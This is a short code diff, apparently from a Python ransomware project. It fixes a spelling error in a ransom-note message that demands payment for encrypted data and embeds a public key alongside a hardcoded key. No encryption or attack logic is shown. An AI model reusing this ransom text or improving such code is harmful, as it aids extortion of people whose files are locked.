@@ -114,7 +114,7 @@ def main():
             "USE - TO GET THE PRICE FOR YOUR DATA\n\n"
             "DO NOT GIVE THIS EMAIL TO 3RD PARTIES\n\n"
             "DO NOT RENAME OR MOVE THE FILE\n\n"
-            "THE FILE IS ECNRYPTED WITH THE FOLLOWING KEY\n"
+            "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY\n"
             "[begin_key]\n{}\n[end_key]\n"
             "KEEP IT\n".format(public_key.decode("utf-8")))
         key = HARDCODED_KEY
